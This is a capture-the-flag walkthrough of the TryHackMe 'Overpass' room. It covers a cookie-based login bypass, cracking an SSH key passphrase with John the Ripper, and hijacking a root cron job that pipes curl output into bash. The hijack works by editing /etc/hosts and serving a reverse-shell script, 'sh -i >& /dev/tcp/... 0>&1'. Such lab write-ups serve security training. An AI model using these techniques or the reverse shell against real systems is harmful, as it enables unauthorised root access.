# Overpass
[TryHackMe room link](https://tryhackme.com/room/overpass)

# Informations about the room
> What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!

# Open ports

22 OpenSSH 7.6p1

80 Golang net/http server

# Enumaration

Gobuster found a `/admin` directory with a login form

The login is not vulnerable to any SQL injections

In the page source we find a login.js

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The login function checks for the response given from the webserver

If the response is "Incorrect Credentials" is prints "Incorrect Credentials"

Otherwise it will set a cookie named "SessionToken" and does a redirect to `/admin`

Since the cookie is not properly checked, it's only checking for the name of the cookie, it's possible to create a custom one

After logging in we are given a ssh key

We can crack it using John the Ripper:

```console
❯ ssh2john id_rsa > forjohn.txt
                                                                                                                                                             
❯ john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2023-03-12 01:04) 50.00g/s 668400p/s 668400c/s 668400C/s pink25..jackets
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

# Privilege escalation

We can write in the `/etc/hosts` file

`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`

And there is a cronjob downloading a `builscript.sh`

We can recreate the `/downloads/src/buildscript.sh` path on our machine and by modifying the `hosts` file we can let the cronjob download the file from our machine

```console
❯ mkdir downloads
❯ cd downloads
❯ mkdir src
❯ echo "sh -i >& /dev/tcp/10.8.37.155/6666 0>&1" > buildscript.sh
```

After a minute we get a root shell
